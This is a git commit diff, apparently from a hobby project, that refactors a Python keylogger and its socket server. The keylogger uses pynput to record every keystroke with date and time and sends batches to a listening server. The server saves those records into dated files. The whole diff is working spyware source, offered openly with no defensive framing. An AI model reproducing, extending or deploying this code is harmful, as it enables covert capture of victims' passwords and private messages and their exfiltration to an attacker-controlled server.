05d0ae55179ca4e636e122bda8ad74c7605273a2
PUMBA32 <sokolovgames42@gmail.com>
2025-02-13 01:23:24 +0300

    a lot of changes

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,157 +1,71 @@
+import socket as sock
 import os
-import socket
+import logging
 import datetime
+
+from typing import List
 from pynput.keyboard import Key, Listener
 
-
-class Client:
-    def __init__(self, host: str = socket.gethostname(), port: int = 12345) -> None:
-        self._host: str = host
-        self._port: int = port
-        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+from client import Client
 
 
-    def connect_to_server(self) -> None:
-        try:
-            self.client.connect((self._host, self._port))  # соединение с серверным сокетом
-        except socket.error as ex: 
-            raise Exception(f"Connection to server failed: {ex}")
-
-
-    def send_data(self, folder_path: str) -> None:
-        try:
-            # Проходимся по каждому файлу из директории и отправляем данные с файла на сервер
-            for filepath in os.listdir(folder_path):
-                data: str = self.__get_data_from_file(os.path.join(folder_path, filepath))
-                self.client.send(data.encode())
-        except socket.error as ex:
-            raise Exception(f"Sending data to server failed: {ex}")
-
-
-    def __get_data_from_file(self, filepath: str) -> str:
-        try:
-            # чтение файла построчно
-            with open(filepath, 'r', encoding='utf-8') as file:
-                lines: list[str] = file.readlines()
-            return "".join(lines)
-        except FileNotFoundError as ex:
-            raise Exception(f"Getting data from file failed: {ex}")
-
-
-    def close(self) -> None:
-        self.client.close()  # закрытие соединения с серверным сокетом
-
-
-class Keylogger:
-    def __init__(self, client: Client) -> None:
+class Keylogger: 
+    def __init__(self, client: Client, keys_limit: int = 10) -> None: 
         self._client: Client = client
+        self._MAX_LIMIT: int = keys_limit  # лимит нажатий перед отправкой
 
-        self._path_to_base_dir: str = os.path.dirname(__file__)  # путь до главной директории (keylogger)
-        self._path_to_data_dir: str = os.path.join(self._path_to_base_dir, "data")  # путь до поддиректории data
-
-        start_time: str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # время запуска скрипта
-        self._path_to_file: str = os.path.join(self._path_to_data_dir, start_time + ".txt")  # путь до созданного файла 
-
-        self.PRESS_LIMIT: int = 10  # лимит нажатых клавиш перед тем, как произойдет запись в файл
+        # настройки логгера
+        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\keylogger_logs.log"
+        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')
 
 
-    def run(self) -> None:
-        self._client.connect_to_server()  # подключение к серверу
-
-        # создание поддиректории data, если ее нету
-        if not os.path.exists(self._path_to_data_dir):
-            os.makedirs(self._path_to_data_dir)
-
-        try:
-            self.__create_file()  # создание файла для хранения данных
-            self.__logging()  # отслеживание нажатий
-        except Exception as ex:
-            print(f"Something went wrong: {ex}")
-
-        self.send_data_to_server()  # отправка данных на сервер
-        self._client.close()  # закрытие соединения
-
-    
-    def send_data_to_server(self) -> None:
-        self._client.send_data(self._path_to_data_dir)  # отправка данных прочитанных с файлов, сохраненных в папке data на сервер
-
-        # Очистка содержимого в папке data
-        for filename in os.listdir(self._path_to_data_dir):
-            file_path = os.path.join(self._path_to_data_dir, filename)
+    def run(self) -> None: 
+        while 1:
             try:
-                if os.path.isfile(file_path):
-                    os.remove(file_path)
-            except Exception as ex:
-                raise Exception(f"Client sending failed: {ex}")
-        
+                self.listen_keys()  # прослушивание нажатий
+            except Exception as err:
+                logging.critical(f"error: {err}")
 
-    def __create_file(self) -> None:
-        # создание файла для записи данных о нажатых клавишах
-        try:
-            file = open(self._path_to_file, 'w', encoding='utf-8') 
-            file.close()
-        except FileNotFoundError as ex:
-            raise Exception(f'Creating file failed: {ex}')
+        self._client.close()
 
 
-# ==================== ПРОЦЕСС СЧИТЫВАНИЯ ДАННЫХ ======================================
+    def listen_keys(self) -> list[str]:
+        keys: List[str] = []  # список нажатий 
 
-    def __logging(self) -> None:
-        keys_logs: list[str] = []  # список нажатых клавиш
+        count: int = 0  # кол-во нажатийы
 
-        self.press_to_write_count = 0  # кол-во нажатий для сохранения в файл
-        self.press_to_send_count = 0  # кол-во нажатий для отправки на сервер
-
-        # метод срабатывающий при нажатии клавиши
-        def on_press(key):
+        def on_press(key) -> None: 
             k: str = str(key).replace("'", "")
             cur_date: str = datetime.date.today().isoformat()  # текущая дата
             cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время
-            keys_logs.append(f'{cur_date}`{cur_time}`{k}\n')
 
-            self.press_to_write_count += 1
-            self.press_to_send_count += 1
-            
-            # запись данных 
-            if self.press_to_write_count >= self.PRESS_LIMIT:
-                self.__write_key(keys_logs)
-                keys_logs.clear()
-                self.press_count = 0
+            mes: str = f'[{cur_date}] {cur_time} - key: \"{k}\"\n'  # лог о нажатии, идущий на сервер
+            keys.append(mes)  
+            logging.info(f'[+] [{cur_date}] {cur_time} - key: \"{k}\"\n')
 
-            # отправка данных на сервер, когда количество нажатых символов будет 100
-            if self.press_to_send_count >= 100:
-                self.send_data_to_server()
-                self.press_to_send_count = 0
+            nonlocal count
+            count += 1
 
-        # метод срабатывающий при отжиме клавиши
-        def on_release(key):
-            if key == Key.esc:
-                self.__write_key(keys_logs)
+            # если число нажатий равно максимальному лимиту
+            if count == self._MAX_LIMIT:
+                self._client.send(keys)  # отправка всего списка с логами на сервер 
+                keys.clear()  # очистка списка
+                count = 0  # обнуление кол-ва нажатий
+
+        def on_release(key) -> None:
+            if key == Key.esc:  # клавиша выхода
                 return False
 
+        # прослушивание нажатий
         try:
-            # прослушивание нажатий
             with Listener(on_press=on_press, on_release=on_release) as listener:
                 listener.join()
-        except Exception as ex:
-            raise Exception(f"Keyboard listening failed: {ex}")
+        except Exception as err:
+            logging.critical(f'Keyboard listening failed: {err}')
 
 
-    def __write_key(self, keys: list[str]) -> None:
-        # запись списка нажатых букв в файл
-        try:
-            mode: str = 'a' if os.path.exists(self._path_to_file) else 'w'
-            with open(self._path_to_file, mode, encoding='utf-8') as file:
-                file.writelines(keys)
-        except Exception as ex:
-            raise Exception(f"Writing key failed: {ex}")
-        
-# =====================================================================================
-
-
-def main() -> None:
-    client: Client = Client()
-    keylogger: Keylogger = Keylogger(client)
+def main() -> None: 
+    keylogger: Keylogger = Keylogger(Client())
     keylogger.run()
 
 
--- server/server.py
+++ server/server.py
@@ -1,105 +1,90 @@
-import socket 
+import socket as sock
 import os
-import sys
+import logging
 
-from typing import List, Optional, Tuple
-
-
-'''
-РАБОТА СЕРВЕРА
-
-1. Слушанье входящих соединений
-2. Принятие клиентского сокета
-3. Получение данных от клиента
-4. Обработка данных: 
-
-'''
+from typing import List
 
 
 class Server:
-    def __init__(self, host: str = socket.gethostname(), port: int = 12345) -> None: 
+    def __init__(self, host: str = sock.gethostname(), port: int = 12345) -> None: 
         self._host: str = host
         self._port: int = port
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, proto=0)
 
-        self._path_to_base_dir: str = os.path.dirname(__file__)
-        self._path_to_data_dir: str = os.path.join(self._path_to_base_dir, "data")
-        
-    
+        self._base_path: str = os.path.dirname(__file__)
+        self._data_path: str = os.path.join(self._base_path, "data")
+
+        # настройки логгера
+        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\server\\server_logs.log"
+        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')
+
+
     def run(self) -> None: 
-        try: 
+        self.server: sock.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM, proto=0)
+
+        try:
             self.server.bind((self._host, self._port))
             self.server.listen()
-            print("listening...")
-            while 1: 
-                conn, addr = self.server.accept()
-                print(f"[+] new connection by: {addr}")
-                try:
-                    self.serve_client(conn)
-                except Exception as ex:
-                    print(f"[ERROR]: {ex}")
-        finally:
+
+            while 1:
+                self.conn, addr = self.server.accept()
+                logging.info(f"[+] new connection with {addr}")
+                
+                with self.conn:
+                    while 1:
+                        try:
+                            data: str = self.__get_data()  # получение данных от клиента
+                            
+                            if not data: 
+                                break
+                            data: List[str] = data.split("\n")
+                            self.__save_data(data)  # сохранение данных в 
+                        except Exception as err:
+                            logging.warning(f"[!!] {addr} failed: {err}")
+        except sock.error as err:
+            logging.critical(f"run() server socket error: {err}")
+        finally: 
             self.server.close()
 
-    
-    def serve_client(self, conn: socket.socket) -> None:         
-        # сохранение данных в папку data
+
+    def __get_data(self) -> str: 
         try:
-            data = self.__get_data(conn)
-            self.__save_data(data)
-        except Exception as ex:
-            raise Exception(f"{ex}")
+            buffer: bytes = self.conn.recv(1024)
 
+            if not buffer: return
 
-    def __save_data(self, data: List[str]) -> None: 
-        # создание папки data, если ее не существует
-        if not os.path.exists(self._path_to_data_dir):
-            os.makedirs(self._path_to_data_dir)
-
-        # проходимся по каждой записи нажатия клавиш в истории нажатий
-        for i, record in enumerate(data):
-            # получаем дату, время и ключ (название нажатой клавиши)
-            try:
-                date, time, key = record.split("`")
-            except Exception as ex:
-                print(f"__save_data() failed. ex: {ex}") 
-                continue
-                   
-            print(f"[+] {i+1}. GET FROM CLIENT: {date}; {time}; key: {key}. Status: ", end="")     
-            
-            # список всех файлов в папке data
-            files: list[str] = os.listdir(self._path_to_data_dir)
-            
-            # проверяем есть ли файл с текущей датой в папке data
-            if (filepath := os.path.join(self._path_to_data_dir, date+".txt")) not in files:
-                self.__create_file(filepath)
-                print(filepath)
-            
-            # добавление записи в файл
-            try:
-                self.__add_to_file(filepath, record)
-            except Exception as ex: print("FAILED...")
-            else: print("SAVED!")
-    
-
-    def __create_file(self, filepath: str, content: Optional[str] = None) -> None:
-        ...
-
-
-    def __add_to_file(self, filepath: str, record: str) -> None:
-        ...
-             
-
-    def __get_data(self, conn: socket.socket) -> Tuple[str]: 
-        try:
-            buffer: bytes = conn.recv(1024)
             data: str = buffer.decode()
-            return tuple(data.split("\n"))                
-        except Exception as ex:
-            raise Exception(f"__get_data. Getting data from client failed: {ex}")
+        except sock.error as err:
+            logging.warning(f"[!] __get_data() failed: {err}") 
+        else:
+            logging.info('[+] __get_data() completed!')
+            return data
 
 
-def main() -> None: 
+    def __save_data(self, lines: List[str]) -> None: 
+        if not os.path.exists(self._data_path):
+            os.makedirs(self._data_path)
+
+        print(lines)
+        for line in lines:
+            files: List[str] = os.listdir(self._data_path)
+            filepath = os.path.join(self._data_path, line[1:11]+".txt")
+            print(files)
+            print(filepath)
+            try:
+                mode: str = 'a' if filepath in files else 'w'
+                
+                with open(filepath, mode, encoding='utf-8') as file:
+                    file.write(line)
+            except FileNotFoundError as err:
+                logging.warning(f"__save_data() file not found error: {err}")
+            except Exception as err:
+                logging.warning(f"__save_data() writing failed: {err}")
+            else:
+                logging.info(f"__save_data() completed!")
+                print("[+] data pack was saved!\n")
+
+
+def main() -> None:
     server: Server = Server()
     server.run()
 
